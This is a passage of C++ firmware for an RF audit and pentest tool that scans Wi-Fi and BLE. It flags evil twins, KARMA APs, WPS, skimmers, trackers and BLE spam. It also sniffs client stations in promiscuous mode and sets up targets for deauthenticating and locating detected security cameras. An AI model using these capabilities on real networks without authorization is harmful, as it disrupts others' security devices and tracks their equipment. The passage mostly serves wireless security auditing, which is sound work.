            [](const WifiFinding& a, const WifiFinding& b) { return a.rssi > b.rssi; });
  std::sort(bleFindings.begin(), bleFindings.end(),
            [](const BleFinding& a, const BleFinding& b) { return a.rssi > b.rssi; });

  if (scanCurrentPass < scanTotalPasses) {
    scanCurrentPass++;
    beginScanPass();
    return;
  }

  rebuildAuditFindings();
  scanTime = timeStamp();
  state = State::DONE;
  status =
      (String(deepScanMode ? "Deep scan complete, " : "Scan complete, ") + auditFindings.size() + " findings").c_str();
  requestUpdate();
}

void RadioAuditActivity::mergeWifiFinding(WifiFinding&& finding) {
  for (auto& existing : wifiFindings) {
    if (existing.bssid == finding.bssid) {
      existing.rssi = averageRssi(existing.rssiSum + finding.rssi, existing.seenCount + 1);
      existing.rssiMin = std::min(existing.rssiMin, finding.rssi);
      existing.rssiMax = std::max(existing.rssiMax, finding.rssi);
      existing.rssiSum += finding.rssi;
      existing.seenCount++;
      // A KARMA/mana AP dynamically clones whatever SSID it's probed for, so the
      // same BSSID reporting a different SSID pass-to-pass is a strong signal --
      // flag it before the new text overwrites the one we alerted on.
      if (!existing.ssid.empty() && !finding.ssid.empty() && existing.ssid != finding.ssid) existing.ssidChanged = true;
      if (existing.ssid.empty() && !finding.ssid.empty()) existing.ssid = finding.ssid;
      existing.auth = finding.auth;
      existing.channel = finding.channel;
      existing.hidden = existing.hidden && finding.hidden;
      existing.wps = existing.wps || finding.wps;
      return;
    }
  }

  if (wifiFindings.size() < MAX_WIFI_FINDINGS) {
    wifiFindings.push_back(std::move(finding));
    return;
  }

  auto weakest = std::min_element(wifiFindings.begin(), wifiFindings.end(),
                                  [](const WifiFinding& a, const WifiFinding& b) { return a.rssi < b.rssi; });
  if (weakest != wifiFindings.end() && finding.rssi > weakest->rssi) {
    *weakest = std::move(finding);
  }
}

void RadioAuditActivity::mergeBleFinding(BleFinding&& finding) {
  for (auto& existing : bleFindings) {
    if (existing.address == finding.address) {
      existing.rssi = averageRssi(existing.rssiSum + finding.rssi, existing.seenCount + 1);
      existing.rssiMin = std::min(existing.rssiMin, finding.rssi);
      existing.rssiMax = std::max(existing.rssiMax, finding.rssi);
      existing.rssiSum += finding.rssi;
      existing.seenCount++;
      if (existing.name.empty() && !finding.name.empty()) existing.name = finding.name;
      if (existing.manufacturerHex.empty() && !finding.manufacturerHex.empty()) {
        existing.manufacturerHex = finding.manufacturerHex;
      }
      if (existing.serviceUuid.empty() && !finding.serviceUuid.empty()) existing.serviceUuid = finding.serviceUuid;
      if (existing.serviceDataHex.empty() && !finding.serviceDataHex.empty()) {
        existing.serviceDataUuid = finding.serviceDataUuid;
        existing.serviceDataHex = finding.serviceDataHex;
      }
      if (finding.hasTxPower) {
        existing.hasTxPower = true;
        existing.txPower = finding.txPower;
      }
      return;
    }
  }

  if (bleFindings.size() < MAX_BLE_FINDINGS) {
    bleFindings.push_back(std::move(finding));
    return;
  }

  auto weakest = std::min_element(bleFindings.begin(), bleFindings.end(),
                                  [](const BleFinding& a, const BleFinding& b) { return a.rssi < b.rssi; });
  if (weakest != bleFindings.end() && finding.rssi > weakest->rssi) {
    *weakest = std::move(finding);
  }
}

void RadioAuditActivity::exportText() {
  const String report = makeTextReport();
  const bool ok = saveFile(TEXT_EXPORT_PATH, report) && saveFile(makeTimestampedPath("txt").c_str(), report);
  state = State::SAVED;
  status = ok ? "Saved text report" : "Save failed";
  requestUpdate();
}

void RadioAuditActivity::exportCsv() {
  const String report = makeCsvReport();
  const bool ok = saveFile(CSV_EXPORT_PATH, report) && saveFile(makeTimestampedPath("csv").c_str(), report);
  state = State::SAVED;
  status = ok ? "Saved CSV report" : "Save failed";
  requestUpdate();
}

void RadioAuditActivity::exportJson() {
  const String report = makeJsonReport();
  const bool ok = saveFile(JSON_EXPORT_PATH, report) && saveFile(makeTimestampedPath("json").c_str(), report);
  state = State::SAVED;
  status = ok ? "Saved JSON report" : "Save failed";
  requestUpdate();
}

void RadioAuditActivity::exportWigle() {
  const String report = makeWigleReport();
  const bool ok = saveFile(WIGLE_EXPORT_PATH, report) && saveFile(makeTimestampedPath("wigle.csv").c_str(), report);
  state = State::SAVED;
  status = ok ? "Saved WiGLE CSV" : "Save failed";
  requestUpdate();
}

bool RadioAuditActivity::saveFile(const char* path, const String& content) {
  Storage.ensureDirectoryExists(AUDIT_DIR);
  if (!Storage.writeFile(path, content)) {
    LOG_ERR("RADIO", "Failed to save %s", path);
    state = State::ERROR;
    status = "Save failed";
    return false;
  }
  return true;
}

String RadioAuditActivity::makeTimestampedPath(const char* ext) const {
  return String(AUDIT_DIR) + "/scan-" + String(millis() / 1000) + "." + ext;
}

void RadioAuditActivity::addAuditFinding(const char* severity, const std::string& title, const std::string& detail,
                                         int wifiIndex, int bleIndex) {
  AuditFinding finding;
  finding.severity = severity;
  finding.title = title;
  finding.detail = detail;
  finding.wifiIndex = wifiIndex;
  finding.bleIndex = bleIndex;
  auditFindings.push_back(std::move(finding));
}

int RadioAuditActivity::bleSpamAdvertCount(std::string& dominantFamily) const {
  static constexpr const char* kFamilies[] = {"Apple", "Swift Pair", "Fast Pair", "Samsung"};
  int counts[4] = {};
  for (const auto& b : bleFindings) {
    const std::string adv =
        decodeBleAdvert(b.manufacturerHex, b.serviceUuid + " " + b.serviceDataUuid, b.serviceDataHex);
    const std::string fam = bleSpamFamily(adv);
    if (fam.empty()) continue;
    for (int i = 0; i < 4; i++) {
      if (fam == kFamilies[i]) {
        counts[i]++;
        break;
      }
    }
  }
  int total = 0, best = 0;
  for (int i = 0; i < 4; i++) {
    total += counts[i];
    if (counts[i] > counts[best]) best = i;
  }
  dominantFamily = kFamilies[best];
  return total;
}

void RadioAuditActivity::rebuildAuditFindings() {
  auditFindings.clear();
  loadWatchlist();

  auto addFinding = [this](const char* severity, const std::string& title, const std::string& detail,
                           int wifiIndex = -1,
                           int bleIndex = -1) { addAuditFinding(severity, title, detail, wifiIndex, bleIndex); };
  auto onWatchlist = [this](const std::string& mac) { return isWatchlisted(mac); };

  int channelCounts[15] = {};
  for (size_t wi = 0; wi < wifiFindings.size(); wi++) {
    const auto& w = wifiFindings[wi];
    if (w.channel >= 1 && w.channel <= 14) channelCounts[w.channel]++;
    if (onWatchlist(w.bssid))
      addFinding("HIGH", "Watchlist hit",
                 (w.ssid.empty() ? w.bssid : w.ssid) + " (" + w.bssid + ") is on your watchlist.", wi);

    const std::string ssid = w.ssid.empty() ? std::string("<hidden>") : w.ssid;
    const std::string base = ssid + " " + w.bssid + " avg " + std::to_string(w.rssi) + " dBm CH" +
                             std::to_string(w.channel) + " seen " + std::to_string(w.seenCount) + "/" +
                             std::to_string(scanTotalPasses);
    if (w.auth == "OPEN") {
      addFinding("HIGH", "Open WiFi network", base + " has no encryption.", wi);
    } else if (w.auth == "WEP") {
      addFinding("HIGH", "WEP WiFi network", base + " uses broken legacy encryption.", wi);
    } else if (w.auth == "WPA") {
      addFinding("MED", "Legacy WPA network", base + " is not WPA2/WPA3.", wi);
    } else if (w.auth.find("EAP") != std::string::npos) {
      addFinding("INFO", "Enterprise (802.1X) network",
                 base + " authenticates via " + w.auth + " - identify the EAP method separately if scoping.", wi);
    }

    if (w.ssidChanged) {
      addFinding("HIGH", "Unstable AP identity (possible KARMA)",
                 base +
                     " advertised a different SSID across scan passes - a hallmark of KARMA/mana-style"
                     " probe-response cloning.",
                 wi);
    }

    if (w.hidden) {
      addFinding("LOW", "Hidden SSID observed", w.bssid + " is hiding its SSID but still appears in scans.", wi);
    }

    if (w.wps) {
      addFinding("MED", "WPS enabled", base + " advertises WPS - exposed to PIN brute-force / Pixie-Dust.", wi);
    }

    const std::string wifiVendor = macVendor(w.bssid);
    // SSID/vendor fingerprint first; fall back to the MAC OUI so cameras with a
    // hidden/renamed SSID (notably Flock Safety) still surface.
    std::string cameraReason = cameraFingerprintReason(ssid, wifiVendor);
    if (cameraReason.empty()) cameraReason = cameraMacReason(w.bssid);
    if (!cameraReason.empty()) {
      const bool flock = cameraReason.find("Flock") != std::string::npos;
      addFinding(
          flock ? "HIGH" : "MED", flock ? "Flock Safety camera" : "Possible security camera",
          base + " matches camera sweep: " + cameraReason + (wifiVendor.empty() ? "." : (" (" + wifiVendor + ").")),
          wi);
    }

    const std::string pwn = pwnagotchiReason(w.ssid, w.bssid);
    if (!pwn.empty()) {
      addFinding("HIGH", "Pwnagotchi detected", base + " - " + pwn + ".", wi);
    }

    if (deepScanMode && w.seenCount < scanTotalPasses) {
      addFinding("INFO", "Intermittent WiFi AP", base + " was not visible in every scan pass.", wi);
    }
  }

  for (size_t i = 0; i < wifiFindings.size(); i++) {
    if (wifiFindings[i].ssid.empty()) continue;
    bool alreadyReported = false;
    for (size_t previous = 0; previous < i; previous++) {
      if (wifiFindings[previous].ssid == wifiFindings[i].ssid) {
        alreadyReported = true;
        break;
      }
    }
    if (alreadyReported) continue;
    int sameSsidCount = 1;
    for (size_t j = i + 1; j < wifiFindings.size(); j++) {
      if (wifiFindings[j].ssid == wifiFindings[i].ssid) sameSsidCount++;
    }
    if (sameSsidCount > 1) {
      // Mixed encryption across one SSID (e.g. an OPEN clone next to the real
      // WPA2 AP) is a classic evil-twin / rogue-AP signal; uniform auth is more
      // likely a legitimate mesh / range-extender.
      bool mixedAuth = false;
      for (size_t j = i + 1; j < wifiFindings.size(); j++) {
        if (wifiFindings[j].ssid == wifiFindings[i].ssid && wifiFindings[j].auth != wifiFindings[i].auth) {
          mixedAuth = true;
          break;
        }
      }
      if (mixedAuth) {
        addFinding("HIGH", "Possible evil twin",
                   wifiFindings[i].ssid + " is broadcast by " + std::to_string(sameSsidCount) +
                       " BSSIDs with different encryption - a rogue clone may be present.");
      } else {
        addFinding("INFO", "Duplicate SSID",
                   wifiFindings[i].ssid + " appears on " + std::to_string(sameSsidCount) + " BSSIDs.");
      }
    }
  }

  // Evil-twin typosquat: SSIDs that closely resemble another (but aren't
  // identical -- that's the exact-duplicate case above) are a classic
  // phishing-AP signature ("Starbucks_WiFi" vs "Starbucks_WlFi").
  {
    std::vector<size_t> uniqueIdx;
    uniqueIdx.reserve(wifiFindings.size());
    for (size_t i = 0; i < wifiFindings.size(); i++) {
      if (wifiFindings[i].ssid.empty()) continue;
      bool dup = false;
      for (size_t u : uniqueIdx) {
        if (wifiFindings[u].ssid == wifiFindings[i].ssid) {
          dup = true;
          break;
        }
      }
      if (!dup) uniqueIdx.push_back(i);
    }
    for (size_t a = 0; a < uniqueIdx.size(); a++) {
      const auto& ssidA = wifiFindings[uniqueIdx[a]].ssid;
      if (ssidA.size() < 4) continue;  // too short to judge similarity meaningfully
      for (size_t b = a + 1; b < uniqueIdx.size(); b++) {
        const auto& ssidB = wifiFindings[uniqueIdx[b]].ssid;
        if (ssidB.size() < 4) continue;
        if (ssidA.size() > ssidB.size() + 2 || ssidB.size() > ssidA.size() + 2) continue;  // cheap pre-filter
        const int dist = levenshteinDistance(ssidA, ssidB);
        if (dist > 0 && dist <= 2) {
          addFinding("MED", "Possible SSID look-alike",
                     ssidA + " (" + wifiFindings[uniqueIdx[a]].bssid + ") closely resembles " + ssidB + " (" +
                         wifiFindings[uniqueIdx[b]].bssid + ") - possible phishing AP.",
                     static_cast<int>(uniqueIdx[a]));
        }
      }
    }
  }

  for (int channel = 1; channel <= 14; channel++) {
    if (channelCounts[channel] >= 4) {
      addFinding(
          "INFO", "Crowded WiFi channel",
          "Channel " + std::to_string(channel) + " has " + std::to_string(channelCounts[channel]) + " visible APs.");
    }
  }

  // Co-channel/adjacent-channel congestion: 2.4GHz channels within +/-4 overlap
  // significantly, so a flat per-channel count (above) understates real
  // interference when APs are spread across several adjacent channels. Score the
  // 3 standard non-overlapping planning channels (1/6/11) by everything nearby.
  for (int primary : {1, 6, 11}) {
    int nearby = 0;
    for (int ch = std::max(1, primary - 4); ch <= std::min(14, primary + 4); ch++) nearby += channelCounts[ch];
    if (nearby >= 6) {
      addFinding("INFO", "Congested channel neighborhood",
                 "Channel " + std::to_string(primary) + " and its overlapping neighbors have " +
                     std::to_string(nearby) + " APs combined - expect interference.");
    }
  }

  for (size_t bi = 0; bi < bleFindings.size(); bi++) {
    const auto& b = bleFindings[bi];
    const std::string label = b.name.empty() ? b.address : b.name + " " + b.address;
    const std::string advType = decodeBleAdvert(b.manufacturerHex, b.serviceDataUuid, b.serviceDataHex);
    const std::string cameraReason = cameraFingerprintReason(label + " " + advType, bleCompany(b.manufacturerHex));
    if (onWatchlist(b.address)) addFinding("HIGH", "Watchlist hit", label + " is on your watchlist.", -1, bi);
    if (!cameraReason.empty()) {
      addFinding("MED", "Possible security camera", label + " matches camera sweep: " + cameraReason + ".", -1, bi);
    }
    const std::string bleThreat =
        bleThreatReason(b.name, b.manufacturerHex, b.serviceUuid + " " + b.serviceDataUuid, b.serviceDataHex);
    if (!bleThreat.empty()) {
      const bool skimmer = bleThreat.find("skimmer") != std::string::npos;
      addFinding(skimmer ? "HIGH" : "MED", skimmer ? "Possible card skimmer" : "Notable BLE device",
                 label + " - " + bleThreat + ".", -1, bi);
    }
    const std::string drone = droneBleReason(b.manufacturerHex, b.serviceUuid, b.serviceDataUuid);
    if (!drone.empty()) {
      addFinding("MED", "Drone Remote ID", label + " - " + drone + " (OpenDroneID).", -1, bi);
    }
    const std::string bleRelay = bleRelayReason(b.rssiMin, b.rssiMax, b.seenCount);
    if (!bleRelay.empty()) {
      addFinding("LOW", "BLE RSSI anomaly",
                 label + " - " + bleRelay + " (" + std::to_string(b.rssiMin) + "/" + std::to_string(b.rssiMax) +
                     " dBm over " + std::to_string(b.seenCount) + " sightings).",
                 -1, bi);
    }
    if (b.rssi >= -55) {
      addFinding("MED", "Close BLE device",
                 label + " is nearby at avg " + std::to_string(b.rssi) + " dBm, seen " + std::to_string(b.seenCount) +
                     "/" + std::to_string(scanTotalPasses) + ".",
                 -1, bi);
    }
    if (advType.find("FindMy") != std::string::npos || advType.find("AirTag") != std::string::npos) {
      addFinding("MED", "Possible tracker", label + " advertises " + advType + " (AirTag/FindMy).", -1, bi);
    } else if (!advType.empty()) {
      addFinding("INFO", "BLE device identified", label + " looks like: " + advType + ".", -1, bi);
    } else if (!b.manufacturerHex.empty()) {
      addFinding("INFO", "BLE manufacturer data", label + " advertises manufacturer data.", -1, bi);
    }
    if (deepScanMode && b.seenCount < scanTotalPasses) {
      addFinding("INFO", "Intermittent BLE device", label + " was not visible in every scan pass.", -1, bi);
    }
  }

  // BLE pairing-popup flood (Flipper Zero / phone-app spam): an abnormal number of
  // distinct pairing adverts in one sweep, not tied to any single device.
  {
    std::string spamFamily;
    const int spam = bleSpamAdvertCount(spamFamily);
    if (spam >= BLE_SPAM_THRESHOLD) {
      addAuditFinding("HIGH", "BLE pairing spam",
                      std::to_string(spam) + " BLE pairing/popup adverts (" + spamFamily +
                          " dominant) - likely a Flipper Zero / app BLE spam flood.");
    }
  }

  // Compare against the previous scan and persist this one (adds NEW/GONE findings).
  // Only for full (Wi-Fi + BLE) scans; a single-radio scan would falsely flag the
  // other radio's devices as "gone".
  if (scanScope == ScanScope::Both) diffAndSaveSnapshot();

  if (auditFindings.empty() && (!wifiFindings.empty() || !bleFindings.empty())) {
    addFinding("INFO", "No obvious findings", "Scan completed without open, weak, close, or crowded indicators.");
  }
}

void RadioAuditActivity::showAuditFindings() {
  if (auditFindings.empty()) {
    status = "No audit findings";
    requestUpdate();
    return;
  }
  showingFindings = true;
  showingDetails = false;
  selectedFinding = 0;
  requestUpdate();
}

void RadioAuditActivity::showWifiDetails() {
  if (wifiFindings.empty()) {
    status = "No WiFi results";
    requestUpdate();
    return;
  }
  showingDetails = true;
  showingFindings = false;
  showingBleDetails = false;
  selectedFinding = 0;
  requestUpdate();
}

void RadioAuditActivity::showBleDetails() {
  if (bleFindings.empty()) {
    status = "No BLE results";
    requestUpdate();
    return;
  }
  showingDetails = true;
  showingFindings = false;
  showingBleDetails = true;
  selectedFinding = 0;
  requestUpdate();
}

void RadioAuditActivity::startCameraSweep() {
  // Self-contained blocking sweep so we can do three passes a normal scan can't:
  //  1) WiFi AP scan (SSID/vendor clues)
  //  2) associated client-station capture (Ring/Blink join as STAs, not APs)
  //  3) ACTIVE BLE scan (scan responses carry device names)
  wifiFindings.clear();
  bleFindings.clear();
  clientFindings.clear();
  scanTotalPasses = 1;
  scanCurrentPass = 1;
  deepScanMode = false;
  state = State::WIFI_SCANNING;
  status = "Camera sweep: WiFi APs...";
  requestUpdateAndWait();

  // 1) WiFi AP scan (blocking).
  prepWifiSta();
  const int n = WiFi.scanNetworks(false, true);
  for (int i = 0; i < n; i++) {
    WifiFinding f;
    f.ssid = WiFi.SSID(i).c_str();
    f.bssid = WiFi.BSSIDstr(i).c_str();
    f.rssi = WiFi.RSSI(i);
    f.rssiMin = f.rssiMax = f.rssiSum = f.rssi;
    f.channel = WiFi.channel(i);
    f.seenCount = 1;
    f.auth = authName(WiFi.encryptionType(i));
    f.hidden = f.ssid.empty();
    mergeWifiFinding(std::move(f));
  }
  WiFi.scanDelete();

  // 2) Associated client stations (channel-hopping promiscuous data capture).
  status = "Camera sweep: clients...";
  requestUpdateAndWait();
  g_clientCap = makeUniqueNoThrow<ClientCapture>();
  if (g_clientCap) {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(&clientPromiscuousCb);
    wifi_promiscuous_filter_t filter = {};
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);
    g_clientCap->active = true;

    // Camera clients live on the channel of an AP we already found, so dwell on
    // those channels for a real window instead of fast-hopping all 13 (the old
    // 300ms/ch hop caught almost nothing -- ~13 frames total). Fall back to a
    // full hop only if we somehow found no APs.
    bool chSeen[14] = {};
    uint8_t apChannels[14];
    int apChCount = 0;
    for (const auto& w : wifiFindings) {
      if (w.channel >= 1 && w.channel <= 13 && !chSeen[w.channel]) {
        chSeen[w.channel] = true;
        apChannels[apChCount++] = static_cast<uint8_t>(w.channel);
      }
    }
    if (apChCount > 0) {
      for (int round = 0; round < 2; round++) {
        for (int i = 0; i < apChCount; i++) {
          esp_wifi_set_channel(apChannels[i], WIFI_SECOND_CHAN_NONE);
          status = "Camera sweep: clients CH" + std::to_string(apChannels[i]) + "...";
          requestUpdate();
          delay(1500);  // dwell long enough to catch periodic camera traffic
        }
      }
    } else {
      for (int ch = 1; ch <= 13; ch++) {
        esp_wifi_set_channel(static_cast<uint8_t>(ch), WIFI_SECOND_CHAN_NONE);
        delay(500);
      }
    }
    g_clientCap->active = false;
    esp_wifi_set_promiscuous(false);
    const int clients = g_clientCap->count;
    LOG_INF("CAM", "sweep: %d APs, %u data frames, %d stations", static_cast<int>(wifiFindings.size()),
            static_cast<unsigned>(g_clientCap->framesSeen), clients);
    clientFindings.reserve(clients);
    for (int i = 0; i < clients; i++) {
      ProbeEntry e;
      e.client = macToString(g_clientCap->rows[i].mac);
      e.apBssid = macToString(g_clientCap->rows[i].bssid);
      e.rssi = g_clientCap->rows[i].rssi;
      e.channel = g_clientCap->rows[i].channel;
      const std::string cam = cameraMacReason(e.client);
      LOG_INF("CAM", "  STA %s %ddBm vendor='%s' ap=%s%s", e.client.c_str(), e.rssi, macVendor(e.client).c_str(),
              e.apBssid.c_str(), cam.empty() ? "" : (" CAMERA:" + cam).c_str());
      clientFindings.push_back(std::move(e));
    }
    g_clientCap.reset();  // free the client table back to the heap
  }
  WiFi.mode(WIFI_OFF);
  delay(150);

  // 3) Active BLE scan (names live in scan responses, which passive misses).
#if defined(RADIO_AUDIT_ENABLE_BLE)
  state = State::BLE_SCANNING;
  status = "Camera sweep: BLE...";
  requestUpdateAndWait();
  // Bounded (erase-as-you-go) active scan. The old accumulating runBleScan retained
  // every advert for the whole window and OOM-aborted in a dense BLE environment.
  runBleScanStreaming(/*windows=*/3, /*active=*/true);
#endif

  std::sort(wifiFindings.begin(), wifiFindings.end(),
            [](const WifiFinding& a, const WifiFinding& b) { return a.rssi > b.rssi; });
  std::sort(bleFindings.begin(), bleFindings.end(),
            [](const BleFinding& a, const BleFinding& b) { return a.rssi > b.rssi; });
  scanTime = timeStamp();
  state = State::DONE;
  showCameraSweep();
}

// Collect every camera-like hit (AP / associated client / BLE) into the
// selectable cameraTargets list. Clients carry the AP they're on for deauth.
void RadioAuditActivity::buildCameraTargets() {
  cameraTargets.clear();
  cameraSel = 0;

  for (const auto& w : wifiFindings) {
    const std::string label = w.ssid.empty() ? std::string("<hidden>") : w.ssid;
    const std::string vendor = macVendor(w.bssid);
    std::string reason = cameraFingerprintReason(label, vendor);
    if (reason.empty()) reason = cameraMacReason(w.bssid);
    if (reason.empty()) reason = cameraVendorReason(vendor);
    if (reason.empty()) continue;
    CameraTarget t;
    t.kind = CameraTarget::Kind::WifiAp;
    t.mac = w.bssid;
    t.label = label;
    t.reason = reason;
    parseBssid(w.bssid, t.macBytes);
    t.channel = w.channel;
    t.rssi = w.rssi;
    cameraTargets.push_back(std::move(t));
  }

  for (const auto& c : clientFindings) {
    const std::string vendor = macVendor(c.client);
    std::string reason = cameraMacReason(c.client);
    if (reason.empty()) reason = cameraVendorReason(vendor);
    // A privacy-randomized MAC has no vendor to match, but a randomized client is
    // a valid camera candidate (modern Ring/Blink rotate MACs) -- surface it
    // instead of silently dropping it.
    if (reason.empty() && vendor == "randomized") reason = "Randomized MAC (possible camera)";
    if (reason.empty()) continue;
    CameraTarget t;
    t.kind = CameraTarget::Kind::Client;
    t.mac = c.client;
    t.label = vendor.empty() ? std::string("client") : vendor;
    t.reason = reason;
    parseBssid(c.client, t.macBytes);
    if (!c.apBssid.empty() && parseBssid(c.apBssid, t.apBytes)) t.hasAp = true;
    // Prefer the channel we actually heard the client on; fall back to its AP's.
    t.channel = (c.channel >= 1 && c.channel <= 14) ? c.channel : 0;
    if (t.channel == 0)
      for (const auto& w : wifiFindings)
        if (w.bssid == c.apBssid) {
          t.channel = w.channel;
          break;
        }
    t.rssi = c.rssi;
    cameraTargets.push_back(std::move(t));
  }

  for (const auto& b : bleFindings) {
    const std::string label = b.name.empty() ? std::string("<unnamed>") : b.name;
    const std::string advType = decodeBleAdvert(b.manufacturerHex, b.serviceDataUuid, b.serviceDataHex);
    const std::string vendor = bleVendorName(b.manufacturerHex);
    std::string reason = cameraFingerprintReason(label + " " + advType, vendor);
    if (reason.empty()) reason = cameraVendorReason(vendor);
    if (reason.empty()) continue;
    CameraTarget t;
    t.kind = CameraTarget::Kind::Ble;
    t.mac = b.address;
    t.addrType = b.addrType;
    t.label = label;
    t.reason = reason;
    t.rssi = b.rssi;
    cameraTargets.push_back(std::move(t));
  }

  // Rank: confident vendor/OUI hits first, low-confidence "Randomized MAC"
  // candidates last; stronger signal first within each tier.
  auto confident = [](const CameraTarget& t) { return t.reason.find("Randomized") == std::string::npos; };
  std::sort(cameraTargets.begin(), cameraTargets.end(), [&](const CameraTarget& a, const CameraTarget& b) {
    if (confident(a) != confident(b)) return confident(a);
    return a.rssi > b.rssi;
  });
}

void RadioAuditActivity::showCameraSweep() {
  buildCameraTargets();
  cameraListTitle = "Cameras";

  if (!cameraTargets.empty()) {
    status = std::to_string(cameraTargets.size()) + " camera(s) - select to act";
    cameraSel = 0;
    showingCameraList = true;
    showingTarget = false;
    showingDetails = false;
    showingFindings = false;
    requestUpdate();
    return;
  }

  // No camera hits: informative text view.
  targetTitle = "Camera Sweep";
  targetLines.clear();
  targetScroll = 0;
  targetFromList = false;
  targetFromCameraList = false;
  targetLocatable = false;
  targetIsCamera = false;
  targetLines.push_back("WiFi APs " + std::to_string(wifiFindings.size()) + "  clients " +
                        std::to_string(clientFindings.size()) + "  BLE " + std::to_string(bleFindings.size()));
  targetLines.push_back("No camera-like RF fingerprints found.");
  targetLines.push_back("5GHz-only cams are invisible to this");
  targetLines.push_back("2.4GHz radio. Keep the camera live");
  targetLines.push_back("(motion/stream) during the sweep.");
  status = "Camera sweep: 0 hits";
  showingCameraList = false;
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::renderCameraList() {
  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  const auto pageHeight = renderer.getScreenHeight();
  renderer.clearScreen();
  const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, cameraListTitle.c_str(),
                 status.c_str());
  const int n = static_cast<int>(cameraTargets.size());
  const int listHeight = pageHeight - contentTop - metrics.buttonHintsHeight - metrics.verticalSpacing;
  GUI.drawList(
      renderer, Rect{0, contentTop, pageWidth, listHeight}, n, cameraSel,
      [this](int i) {
        const CameraTarget& t = cameraTargets[i];
        const char* k = t.kind == CameraTarget::Kind::WifiAp ? "AP" : t.kind == CameraTarget::Kind::Ble ? "BLE" : "STA";
        return std::string("[") + k + "] " + t.label + "  " + std::to_string(t.rssi) + "dBm";
      },
      nullptr, nullptr);
  const auto labels = mappedInput.mapLabels("Back", "Select", "Up", "Down");
  UITheme::getInstance().suppressBrandLogoOnce();
  GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  renderer.displayBuffer();
}

void RadioAuditActivity::openCameraDetail(int idx) {
  if (idx < 0 || idx >= static_cast<int>(cameraTargets.size())) return;
  const CameraTarget& t = cameraTargets[idx];

  targetIsFindMy = t.findMy;
  targetTitle = t.findMy ? "Tracker" : "Camera";
  targetLines.clear();
  targetScroll = 0;
  const char* kindStr = t.kind == CameraTarget::Kind::WifiAp ? "WiFi AP"
                        : t.kind == CameraTarget::Kind::Ble  ? "BLE"
                                                             : "WiFi client";
  targetLines.push_back(t.label);
  targetLines.push_back(std::string(kindStr) + "  " + t.mac);
  targetLines.push_back(std::to_string(t.rssi) + " dBm" + (t.channel ? "  CH" + std::to_string(t.channel) : ""));
  targetLines.push_back(t.reason);
  if (t.kind == CameraTarget::Kind::Client) {
    if (t.hasAp)
      targetLines.push_back("on AP " + macToString(t.apBytes));
    else
      targetLines.push_back("AP unknown (deauth needs it)");
  }

  // Locator + directed-deauth target state.
  targetIsCamera = true;
  targetLocatable = true;  // all kinds can be located (WiFi by MAC, BLE by address)
  targetCamChannel = t.channel;
  targetCamHasAp = t.hasAp;
  memcpy(targetCamMac, t.macBytes, 6);
  memcpy(targetCamAp, t.apBytes, 6);

  if (t.kind == CameraTarget::Kind::Ble) {
    targetLocBle = true;
    targetLocAddr = t.mac;
    targetLocAddrType = t.addrType;
  } else {
    targetLocBle = false;
    memcpy(targetLocBssid, t.macBytes, 6);  // locate by this device's MAC (matches any addr field)
    targetLocChannel = (t.channel >= 1 && t.channel <= 13) ? t.channel : 1;
  }

  targetFromList = false;
  targetFromCameraList = true;
  targetMenuOpen = false;
  showingTarget = true;
  showingCameraList = false;
  showingDetails = false;
  requestUpdate();
}

void RadioAuditActivity::showAbout() {
  targetTitle = "About Radio Ink";
  targetLines.clear();
  targetScroll = 0;
  targetFromList = false;
  targetLocatable = false;
  targetLines.push_back("Radio Ink");
  targetLines.push_back("Version: " RADIOINK_VERSION);
  targetLines.push_back("");
  targetLines.push_back("Created by dag nazty");
  targetLines.push_back("https://dagnazty.dev");
  targetLines.push_back("");
  targetLines.push_back("RF audit / pentest firmware");
  targetLines.push_back("for the Xteink X-series (ESP32-C3).");
  targetLines.push_back("Authorized testing only.");
  status = "About";
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::startTrackerSweep() {
  bleFindings.clear();
  scanTotalPasses = 1;
  scanCurrentPass = 1;
  deepScanMode = false;
  state = State::BLE_SCANNING;
  status = "Tracker sweep: BLE...";
  requestUpdateAndWait();

#if defined(RADIO_AUDIT_ENABLE_BLE)
  // Bounded (erase-as-you-go) active scan. The old accumulating runBleScan retained
  // every advert for the whole window and OOM-aborted in a dense BLE environment.
  runBleScanStreaming(/*windows=*/3, /*active=*/true);
#endif

  std::sort(bleFindings.begin(), bleFindings.end(),
            [](const BleFinding& a, const BleFinding& b) { return a.rssi > b.rssi; });
  scanTime = timeStamp();
  state = State::DONE;

  // Build a selectable list of tracker hits (reusing the camera-hit list machinery).
  // Selecting one opens the detail view with Locate, plus Play Sound for Find My tags.
  cameraTargets.clear();
  cameraSel = 0;
  for (const auto& b : bleFindings) {
    const std::string reason = trackerReason(b.manufacturerHex, b.serviceDataUuid, b.serviceDataHex, b.name);
    if (reason.empty()) continue;
    CameraTarget t;
    t.kind = CameraTarget::Kind::Ble;
    t.mac = b.address;
    t.addrType = b.addrType;
    t.label = b.name.empty() ? reason : b.name;
    t.reason = reason;
    t.rssi = b.rssi;
    t.findMy = reason.rfind("Apple", 0) == 0;  // Apple Find My / AirTag → play-sound eligible
    cameraTargets.push_back(std::move(t));
  }
  const int hits = static_cast<int>(cameraTargets.size());

  if (hits > 0) {
    cameraListTitle = "Trackers";
    status = std::to_string(hits) + " tracker(s) - select to act";
    showingCameraList = true;
    showingTarget = false;
    showingDetails = false;
    showingFindings = false;
    requestUpdate();
    return;
  }

  // No hits: informative text view.
  targetTitle = "Tracker Sweep";
  targetLines.clear();
  targetScroll = 0;
  targetFromList = false;
  targetLocatable = false;
  targetLines.push_back("BLE devices " + std::to_string(bleFindings.size()));
  targetLines.push_back("No known trackers detected.");
  targetLines.push_back("Note: AirTags rotate their MAC and");
  targetLines.push_back("only beacon FindMy when separated");
  targetLines.push_back("from their owner.");
  status = "Trackers: 0";
  showingCameraList = false;
  showingTarget = true;
  showingDetails = false;
  showingFindings = false;
  requestUpdate();
}

void RadioAuditActivity::startThreatSweep() {
  // Passive signature sweep: a WiFi AP scan (Pwnagotchi beacons, Axon cameras)
